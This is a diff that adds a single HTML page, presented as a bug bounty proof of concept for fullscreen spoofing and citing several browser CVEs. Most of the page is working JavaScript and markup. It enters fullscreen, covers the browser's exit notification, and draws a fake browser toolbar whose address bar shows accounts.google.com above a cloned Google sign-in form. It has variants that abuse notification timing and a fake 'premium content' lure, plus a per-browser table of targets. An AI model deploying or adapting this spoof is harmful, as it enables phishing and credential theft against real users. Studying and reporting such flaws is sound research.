@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fullscreen Spoofing PoC — Bug Bounty Research</title>
+<style>
+  body { font-family: system-ui, sans-serif; background: #1a1a2e; color: #eee; padding: 30px; }
+  h1 { color: #f0883e; margin-bottom: 8px; }
+  .meta { color: #888; font-size: 14px; margin-bottom: 24px; }
+  .info { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 20px; margin-bottom: 24px; }
+  .info h3 { color: #58a6ff; margin-bottom: 10px; }
+  .info pre { background: #0d1117; padding: 14px; border-radius: 6px; font-size: 13px; overflow-x: auto; color: #c9d1d9; }
+  .btn { padding: 12px 24px; background: #e05c5c; color: white; border: none; border-radius: 8px;
+         cursor: pointer; font-size: 15px; font-weight: bold; margin-right: 12px; margin-bottom: 8px; }
+  .btn:hover { background: #c0392b; }
+  .btn.b2 { background: #2980b9; }
+  .btn.b2:hover { background: #1f6391; }
+  .btn.b3 { background: #27ae60; }
+  .status { margin-top: 20px; padding: 14px; background: #0d2d3a; border-radius: 6px; display: none; }
+  .matrix { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 12px; margin-top: 16px; }
+  .browser-card { background: #16213e; border: 1px solid #0f3460; border-radius: 6px; padding: 14px; }
+  .browser-card h4 { font-size: 14px; margin-bottom: 6px; }
+  .tick { color: #3fb950; } .cross { color: #f85149; } .maybe { color: #e3b341; }
+
+  /* The fake browser UI shown in fullscreen */
+  #fake-browser {
+    display: none;
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: #f8f9fa; z-index: 999999; flex-direction: column;
+  }
+  #fake-toolbar {
+    background: linear-gradient(to bottom, #e8eaed, #dee0e3);
+    padding: 8px 12px;
+    display: flex; align-items: center; gap: 10px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+  }
+  #fake-nav-buttons { display: flex; gap: 6px; }
+  #fake-nav-buttons button {
+    background: none; border: none; font-size: 16px; cursor: pointer;
+    color: #5f6368; padding: 4px 8px; border-radius: 4px;
+  }
+  #fake-address-bar {
+    flex: 1; background: white; border: 1px solid #dadce0; border-radius: 20px;
+    padding: 6px 16px; font-size: 14px; display: flex; align-items: center; gap: 8px;
+  }
+  #fake-address-bar .lock { color: #188038; font-size: 14px; }
+  #fake-address-bar .url { color: #202124; flex: 1; }
+  #fake-address-bar .url .domain { font-weight: 600; }
+  #fake-content { flex: 1; background: white; display: flex; flex-direction: column; }
+  #fake-content iframe { width: 100%; flex: 1; border: none; }
+  #exit-btn { position: fixed; bottom: 20px; right: 20px; background: #333;
+              color: white; border: none; padding: 10px 18px; border-radius: 20px;
+              cursor: pointer; font-size: 13px; z-index: 9999999; }
+</style>
+</head>
+<body>
+
+<h1>🖥 Fullscreen Spoofing PoC</h1>
+<div class="meta">CVE-2025-1019 (Firefox) · CVE-2024-8388 (Firefox Android) · CVE-2022-46877 · CVE-2023-25743</div>
+
+<div class="info">
+  <h3>How It Works</h3>
+  <p>Browser goes fullscreen → notification bar appears briefly → attacker HTML covers it → user sees fake browser chrome with spoofed URL.</p>
+  <pre>document.documentElement.requestFullscreen()
+  .then(() => showFakeBrowserUI("https://accounts.google.com"));</pre>
+  <h3 style="margin-top:16px">Root Cause by Browser</h3>
+  <div class="matrix">
+    <div class="browser-card">
+      <h4>Chrome / Chromium</h4>
+      <p><span class="tick">✓</span> Shows "Press Esc to exit" notification<br>
+      <span class="maybe">⚠</span> Notification can be covered with CSS z-index trick<br>
+      <span class="cross">✗</span> Modern versions improved timing</p>
+    </div>
+    <div class="browser-card">
+      <h4>Firefox Desktop</h4>
+      <p><span class="tick">✓</span> CVE-2025-1019: z-order window manipulation<br>
+      <span class="tick">✓</span> CVE-2022-46877: delay/suppress notification<br>
+      <span class="maybe">⚠</span> Check current version behavior</p>
+    </div>
+    <div class="browser-card">
+      <h4>Firefox Android</h4>
+      <p><span class="tick">✓</span> CVE-2024-8388: multiple overlapping prompts<br>
+      <span class="tick">✓</span> CVE-2023-25743: no in-app notification<br>
+      <span class="tick">✓</span> Most vulnerable — smaller screen, fewer signals</p>
+    </div>
+    <div class="browser-card">
+      <h4>Edge (Chromium)</h4>
+      <p><span class="maybe">⚠</span> Same engine as Chrome<br>
+      <span class="maybe">⚠</span> Custom notification UI may have diff timing<br>
+      <span class="tick">✓</span> Test independently — patches lag Chrome</p>
+    </div>
+    <div class="browser-card">
+      <h4>Brave</h4>
+      <p><span class="maybe">⚠</span> Chromium-based, same behavior<br>
+      <span class="tick">✓</span> Brave has custom shields UI that may interfere<br>
+      <span class="tick">✓</span> Test — different notification overlay timing</p>
+    </div>
+    <div class="browser-card">
+      <h4>Opera / Arc</h4>
+      <p><span class="maybe">⚠</span> Chromium-based<br>
+      <span class="tick">✓</span> Different toolbar layouts = different spoofing targets<br>
+      <span class="tick">✓</span> Arc has unique sidebar UI — test sidebar spoofing</p>
+    </div>
+    <div class="browser-card">
+      <h4>Safari (macOS)</h4>
+      <p><span class="tick">✓</span> CVE-2015-3755: address bar spoof in fullscreen<br>
+      <span class="maybe">⚠</span> macOS fullscreen = different UX<br>
+      <span class="tick">✓</span> iOS Safari most promising on mobile</p>
+    </div>
+  </div>
+</div>
+
+<button class="btn" onclick="runBasic()">▶ Basic Fullscreen Spoof</button>
+<button class="btn b2" onclick="runWithDelay()">⏱ Delayed Entry (timing bypass)</button>
+<button class="btn b3" onclick="runWithScroll()">📜 Scroll Trigger</button>
+
+<div class="status" id="status"></div>
+
+<!-- The fake browser UI -->
+<div id="fake-browser">
+  <div id="fake-toolbar">
+    <div id="fake-nav-buttons">
+      <button>←</button>
+      <button>→</button>
+      <button>↻</button>
+    </div>
+    <div id="fake-address-bar">
+      <span class="lock">🔒</span>
+      <span class="url">
+        <span class="domain" id="spoofed-domain">accounts.google.com</span>
+        <span id="spoofed-path">/login</span>
+      </span>
+    </div>
+  </div>
+  <div id="fake-content">
+    <div id="fake-page" style="padding:40px; font-family:'Google Sans',Arial,sans-serif; background:#f8f9fa;">
+      <div style="max-width:450px; margin:40px auto; background:#fff; border:1px solid #dadce0; border-radius:8px; padding:48px 40px; box-shadow:0 2px 10px rgba(0,0,0,0.08);">
+        <div style="text-align:center; margin-bottom:24px;">
+          <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+            <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+            <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+            <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+            <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+            <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+            <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
+          </svg>
+        </div>
+        <h2 style="color:#202124; font-size:24px; font-weight:400; margin:0 0 8px; text-align:center;">Sign in</h2>
+        <p style="color:#5f6368; font-size:16px; text-align:center; margin:0 0 24px;">to continue to Google Account</p>
+        <input type="email" placeholder="Email or phone" style="width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;margin-bottom:6px;font-size:16px;box-sizing:border-box;outline:none">
+        <div style="text-align:right;margin-bottom:20px"><a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none">Forgot email?</a></div>
+        <p style="color:#3c4043;font-size:14px;margin-bottom:20px">Not your computer? Use a private browsing window to sign in. <a href="#" style="color:#1a73e8;text-decoration:none">Learn more</a></p>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px">
+          <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500">Create account</a>
+          <button style="padding:10px 24px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:0.25px">Next</button>
+        </div>
+        <p style="text-align:center;margin-top:20px;font-size:11px;color:#f44336;border-top:1px solid #e8eaed;padding-top:12px">⚠ RESEARCH PoC — Address bar shows accounts.google.com but this is a spoofed page</p>
+      </div>
+    </div>
+  </div>
+  <button id="exit-btn" onclick="exitSpoof()">✕ Exit (Press Esc)</button>
+</div>
+
+<script>
+const TARGET_DOMAIN = "accounts.google.com";
+const TARGET_PATH = "/signin/v2/identifier";
+
+function setSpoofedURL(domain, path) {
+  document.getElementById('spoofed-domain').textContent = domain;
+  document.getElementById('spoofed-path').textContent = path || '';
+}
+
+function showFakeBrowser() {
+  const fb = document.getElementById('fake-browser');
+  fb.style.display = 'flex';
+  setSpoofedURL(TARGET_DOMAIN, TARGET_PATH);
+}
+
+function hideFakeBrowser() {
+  document.getElementById('fake-browser').style.display = 'none';
+}
+
+function exitSpoof() {
+  hideFakeBrowser();
+  if (document.fullscreenElement) {
+    document.exitFullscreen();
+  }
+  logStatus('User exited spoof. Press F11 or Esc to fully exit fullscreen.', 'info');
+}
+
+function logStatus(msg, type) {
+  const s = document.getElementById('status');
+  s.style.display = 'block';
+  const color = type === 'success' ? '#3fb950' : type === 'error' ? '#f85149' : '#58a6ff';
+  s.innerHTML += `<div style="color:${color}; margin-bottom:6px;">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+}
+
+// Variant 1: Basic — request fullscreen, show fake UI immediately
+async function runBasic() {
+  logStatus('Requesting fullscreen...', 'info');
+  try {
+    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+    // Small delay to let browser show its notification, then cover it
+    setTimeout(showFakeBrowser, 300);
+    logStatus('Fullscreen entered. Fake UI shown after 300ms. Did notification get covered?', 'success');
+  } catch(e) {
+    logStatus('Fullscreen denied: ' + e.message + ' — must be triggered by user gesture', 'error');
+  }
+}
+
+// Variant 2: Delayed — enter fullscreen, exit, re-enter to confuse notification timing
+async function runWithDelay() {
+  logStatus('Running delayed timing attack...', 'info');
+  try {
+    // Enter fullscreen normally — browser shows notification
+    await document.documentElement.requestFullscreen();
+    logStatus('First fullscreen entered', 'info');
+
+    // Exit immediately
+    await new Promise(r => setTimeout(r, 100));
+    await document.exitFullscreen();
+    logStatus('Exited fullscreen', 'info');
+
+    // Re-enter quickly — notification may not re-show or show too briefly
+    await new Promise(r => setTimeout(r, 50));
+    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+    showFakeBrowser();
+    logStatus('Re-entered fullscreen — notification may be suppressed. Check if visible!', 'success');
+  } catch(e) {
+    logStatus('Error: ' + e.message, 'error');
+  }
+}
+
+// Variant 3: Scroll trigger — fake "read more" prompt
+function runWithScroll() {
+  logStatus('Scroll-triggered variant — user clicks "Continue Reading"', 'info');
+  const overlay = document.createElement('div');
+  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:1000;display:flex;align-items:center;justify-content:center;';
+  overlay.innerHTML = `
+    <div style="background:white;color:#333;padding:32px;border-radius:12px;text-align:center;max-width:380px;">
+      <h2 style="margin-bottom:12px;">🔒 This content is premium</h2>
+      <p style="margin-bottom:20px;color:#666;">Sign in to continue reading. We'll open a secure login window.</p>
+      <button id="go-full" style="background:#1a73e8;color:white;border:none;padding:12px 28px;border-radius:6px;font-size:15px;cursor:pointer;width:100%">
+        Continue Reading →
+      </button>
+    </div>`;
+  document.body.appendChild(overlay);
+
+  document.getElementById('go-full').onclick = async () => {
+    overlay.remove();
+    try {
+      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+      setTimeout(showFakeBrowser, 200);
+      logStatus('Fullscreen triggered via social engineering click. Fake UI shown.', 'success');
+    } catch(e) {
+      logStatus('Error: ' + e.message, 'error');
+    }
+  };
+}
+
+// Handle ESC key
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') hideFakeBrowser();
+});
+
+// Fullscreen change event
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) {
+    hideFakeBrowser();
+    logStatus('Fullscreen exited by browser/user', 'info');
+  }
+});
+</script>
+</body>
+</html>
